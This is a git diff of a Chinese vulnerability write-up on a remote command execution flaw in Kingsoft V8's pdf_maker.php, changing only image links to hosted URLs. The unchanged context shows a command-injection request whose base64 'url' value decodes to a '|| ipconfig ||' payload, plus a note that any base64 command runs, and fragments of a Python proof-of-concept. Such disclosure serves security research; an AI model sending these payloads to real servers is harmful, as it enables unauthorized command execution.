@@ -100,7 +100,7 @@ require_once (dirname(__FILE__)."\\common\\HTTPrequest_SCpost.php");
 ?>
 ```
 
-![](image/js-7.png)
+![](http://wikioss.peiqi.tech/vuln/js-7.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 这里传入 base64加密的拼接命令即可执行任意命令
 
@@ -126,7 +126,7 @@ Cookie: PHPSESSID=noei1ghcv9rqgp58jf79991n04
 url=IiB8fCBpcGNvbmZpZyB8fA%3D%3D&fileName=xxx
 ```
 
-![](image/js-8.png)
+![](http://wikioss.peiqi.tech/vuln/js-8.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## 漏洞POC
 
@@ -171,7 +171,7 @@ if __name__ == '__main__':
     POC_1(target_url)
 ```
 
-![](image/js-10.png)
+![](http://wikioss.peiqi.tech/vuln/js-10.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 ## Goby & POC
 
@@ -179,4 +179,4 @@ if __name__ == '__main__':
 >
 > Kingsoft V8 pdf_maker.php RCE
 
-![](image/js-9.png)
+![](http://wikioss.peiqi.tech/vuln/js-9.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
